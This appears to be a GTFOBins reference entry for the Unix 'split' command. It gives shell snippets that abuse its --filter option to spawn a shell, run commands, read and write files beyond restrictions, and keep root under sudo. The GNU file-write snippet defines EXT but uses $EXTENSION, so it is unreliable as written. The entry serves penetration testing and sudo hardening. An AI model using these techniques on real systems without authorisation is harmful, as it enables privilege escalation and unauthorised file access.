# GTFOBin: split

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

The shell prompt is not printed.

```
split --filter=/bin/sh /dev/stdin
```

## Command

It can be used to break out from restricted environments by running non-interactive system commands.

Command execution using an existing or newly created file.

```
COMMAND=id
TF=$(mktemp)
split --filter=$COMMAND $TF
```

Command execution using stdin (and close it directly).

```
COMMAND=id
echo | split --filter=$COMMAND /dev/stdin
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

Data will be written in the current directory in a file named `xaa` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.

```
TF=$(mktemp)
echo DATA >$TF
split -b999m $TF
```

GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.

```
EXT=.xxx
TF=$(mktemp)
echo DATA >$TF
split -b999m --additional-suffix $EXTENSION $TF
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
TF=$(mktemp)
split $LFILE $TF
cat $TF*
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

The shell prompt is not printed.

```
sudo split --filter=/bin/sh /dev/stdin
```